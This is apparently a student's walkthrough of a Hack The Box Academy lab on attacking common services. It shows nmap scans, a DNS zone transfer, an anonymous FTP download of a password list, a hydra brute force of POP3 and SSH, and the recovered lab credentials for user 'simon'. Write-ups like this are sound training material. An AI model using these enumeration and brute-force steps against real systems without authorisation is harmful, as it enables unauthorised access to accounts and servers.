# Attacking Common Services - Medium

[Attacking Common Services - Medium](https://academy.hackthebox.com/module/116/section/1467)  

>The second server is an internal server within the `inlanefreight.htb` domain,
>that manages and stores emails and files and serves as a backup of some of the company's processes. 
>From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.  

## Enumeration  

>NMAP Scans and results:  

```
sudo nmap -p- 10.129.201.127

PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
110/tcp   open  pop3
995/tcp   open  pop3s
2121/tcp  open  ccproxy-ftp
30021/tcp open  unknown
```  

>Detail services and version NMAP scan:  

```
sudo nmap -p 22,53,110,995,2121,30021 -sCV -A -O 10.129.201.127

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
53/tcp    open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
110/tcp   open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: USER UIDL CAPA RESP-CODES AUTH-RESP-CODE STLS TOP PIPELINING SASL(PLAIN)
995/tcp   open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: USER UIDL PIPELINING CAPA RESP-CODES TOP AUTH-RESP-CODE SASL(PLAIN)
2121/tcp  open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.201.127]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
30021/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Internal FTP) [10.129.201.127]
```  

### DNS  

>Attacking DNS on port 53 UDP.  

>Update local DNS hosts file `etc/hosts` with the IP of `inlanefreight.htb` domain.  

```
sudo vi /etc/hosts
```

>DNS Zone Transfer - use the `dig` utility with DNS query type `AXFR` option to dump the entire DNS namespaces from a vulnerable DNS server:

```
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```  

![dns-Attacking-Common-Services-medium](/images/dns-Attacking-Common-Services-medium.png)  

### FTP  

>[Attacking FTP](https://academy.hackthebox.com/module/116/section/1165) directory and files operations.  

>checks if a FTP server on port 30021 allows anonymous logins.  

```
ftp 10.129.201.127 30021

ls -al
cd simon
get mynotes.txt
```

>FTP file retrieved `mynotes.txt` contained the following information:  

```
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81
```  

### POP3

>[Attacking Email Services](https://academy.hackthebox.com/module/116/section/1173) include smtp, pop3, and IMAP4.  

>The file `mynotes.txt` retrieved from FTP on port `30021` look like list of passwords and can be used in Password Attacks.  

```
hydra -l simon -P mynotes.txt -f 10.129.201.127 pop3
```  

>HYDRA brute force discovered valid credentials for user `simon` against `SSH` and `POP3` services:  

```
[110][pop3] host: 10.129.201.127   login: simon   password: 8Ns8j1b!23hs4921smHzwn

[22][ssh] host: 10.129.201.127   login: simon   password: 8Ns8j1b!23hs4921smHzwn
```  

## Foothold  

>The discovered credentials for Simon allow SSH connection.

```
ssh simon@10.129.201.127

cat flag.txt
```  










                                        